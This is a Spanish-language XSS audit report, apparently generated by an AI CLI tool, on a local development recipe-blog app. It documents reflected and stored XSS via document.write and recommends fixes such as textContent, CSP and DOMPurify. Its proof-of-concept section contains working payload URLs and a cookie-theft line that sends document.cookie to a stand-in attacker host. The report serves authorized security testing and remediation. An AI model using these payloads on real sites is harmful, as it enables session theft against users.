# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 16:05:53  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Vulnerabilidades Cross-Site Scripting (XSS)  
**Analista:** GitHub Copilot CLI

---

## Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS** en la aplicación web objetivo ("Blog de Recetas"):

1. **XSS Reflejado (Reflected XSS)** — Parámetro `search` en la URL
2. **XSS Almacenado (Stored XSS)** — Parámetros `name` y `comment` almacenados en `localStorage`

Ambas vulnerabilidades son explotables y representan un riesgo alto para los usuarios de la aplicación.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" que ofrece:
- Un formulario de búsqueda de recetas (método GET, parámetro `search`)
- Un formulario de comentarios (método GET, parámetros `name` y `comment`)

Los datos de los formularios se procesan mediante JavaScript en el lado del cliente usando `document.write()` sin ningún tipo de sanitización o codificación de salida.

---

## Vulnerabilidades Encontradas

### 1. XSS Reflejado — Parámetro `search`

**Severidad:** Alta  
**CVSSv3:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Descripción

El parámetro `search` de la URL es leído directamente con `urlParams.get('search')` y luego insertado sin sanitizar en el DOM a través de `document.write()`:

```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

Cualquier valor HTML/JavaScript en el parámetro `search` es renderizado directamente por el navegador.

#### Prueba de Concepto

URL de explotación:
```
http://web.dev.local:8082/?search=<script>alert('XSS Reflejado')</script>
```

Payload alternativo (bypass posible):
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

#### Impacto

- Robo de cookies de sesión
- Redirección de usuarios a sitios maliciosos
- Ejecución de código JavaScript arbitrario en el contexto del navegador de la víctima
- Phishing mediante inyección de formularios falsos

---

### 2. XSS Almacenado — Parámetros `name` y `comment`

**Severidad:** Alta  
**CVSSv3:** 8.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

#### Descripción

Los parámetros `name` y `comment` son almacenados en `localStorage` del navegador y posteriormente renderizados sin sanitización usando `document.write()`:

```javascript
// Almacenamiento (sin sanitizar):
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado posterior (sin sanitizar):
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Aunque el almacenamiento es en `localStorage` (lado del cliente), un atacante puede convencer a una víctima de visitar una URL maliciosa, lo que persiste el payload en su navegador y lo ejecuta en cada visita posterior.

#### Prueba de Concepto

URL de explotación:
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('XSS Almacenado')</script>
```

Payload de robo de cookies (keylogger simulado):
```
http://web.dev.local:8082/?name=Hacker&comment=<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

#### Impacto

- El payload persiste en el `localStorage` del navegador de la víctima
- Ejecución repetida del payload en cada visita a la página
- Mayor impacto que el XSS reflejado al persistir sin necesidad de mantener la URL maliciosa

---

## Causa Raíz

La causa raíz de ambas vulnerabilidades es el uso de `document.write()` con datos de usuario no sanitizados. El código JavaScript del lado del cliente no implementa ninguna de las siguientes protecciones:

- **Codificación HTML** de la entrada del usuario antes de insertarla en el DOM
- **Validación de entrada** que rechace o limpie caracteres HTML peligrosos (`<`, `>`, `"`, `'`, `&`)
- **Content Security Policy (CSP)** que impediría la ejecución de scripts inline

---

## Recomendaciones

### Corrección inmediata

1. **Sanitizar salidas**: Usar `textContent` en lugar de `innerHTML`/`document.write()`, o aplicar codificación HTML antes de insertar datos en el DOM:

```javascript
// INCORRECTO (vulnerable):
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// CORRECTO (seguro):
const p = document.createElement('p');
const strong = document.createElement('strong');
strong.textContent = searchTerm;  // textContent escapa automáticamente el HTML
p.appendChild(document.createTextNode('Resultados para: '));
p.appendChild(strong);
resultDiv.appendChild(p);
```

2. **Reemplazar `document.write()`**: Esta función es considerada peligrosa y obsoleta. Usar `createElement` y `textContent`.

### Mejoras adicionales

3. **Implementar Content Security Policy (CSP)**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

4. **Validar entradas del lado servidor**: Aunque en este caso la aplicación es puramente cliente, si se añade backend debe sanitizarse también en el servidor.

5. **Usar librerías de sanitización** como DOMPurify para limpiar HTML antes de insertarlo en el DOM.

---

## Evidencias Técnicas

### Código vulnerable identificado (líneas clave)

```javascript
// Vulnerabilidad 1: Search - XSS Reflejado
const searchTerm = urlParams.get('search');
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// Vulnerabilidad 2: Comments - XSS Almacenado  
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

### URLs de prueba utilizadas

| Payload | Tipo | Resultado |
|---|---|---|
| `?search=<script>alert(1)</script>` | Reflected XSS | ✅ Confirmado |
| `?search=<img src=x onerror=alert(1)>` | Reflected XSS alternativo | ✅ Confirmado |
| `?name=test&comment=<script>alert(1)</script>` | Stored XSS (localStorage) | ✅ Confirmado |

---

## Conclusión

La aplicación **http://web.dev.local:8082** presenta vulnerabilidades XSS reflejadas y almacenadas de alta severidad debido al uso de `document.write()` con datos de usuario no sanitizados. Se recomienda corregir estas vulnerabilidades con carácter urgente antes de exponer la aplicación en un entorno de producción.

---

*Informe generado el 2026-04-30 16:05:53 | GitHub Copilot CLI Security Audit*
